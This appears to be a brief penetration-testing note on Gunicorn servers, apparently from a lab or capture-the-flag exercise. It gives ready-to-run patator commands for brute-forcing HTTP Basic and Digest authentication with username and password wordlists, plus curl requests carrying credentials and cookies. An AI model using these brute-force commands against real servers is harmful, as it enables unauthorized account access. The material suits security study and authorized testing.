According to their website, Gunicorn is a “Python Web Server Gateway Interface HTTP Server".
According it Google, Gunicorn is primarily used to serve Python web applications.

Browse to the site / python web app at http://10.10.10.91:5000

## Bruteforce HTTP Authentication


### Basic


Bruteforce just like normal.
patator http_fuzz url=http://$ip user_pass=FILE0:FILE1 0=/usr/share/metasploit-framework/data/wordlists/unix_users.txt 1=wordlists/100-common-passwords.txt -x ignore:code=401

### Digest


Gunicorn digest authentcation won't work unless you send it a cookie.
With patator, can do accept_cookie=1 to repeat a cookie it receives.

patator http_fuzz url=http://$ip user_pass=FILE0:FILE1 auth_type=digest 0=/usr/share/metasploit-framework/data/wordlists/unix_users.txt 1=wordlists/100-common-passwords.txt -x ignore:code=401 accept_cookie=1

Can then access web page by providing any random cookie value
curl --user admin:cookie1 --digest --cookie blah http://$ip

curl -H "Authorization: Token 123123123" http://$ip
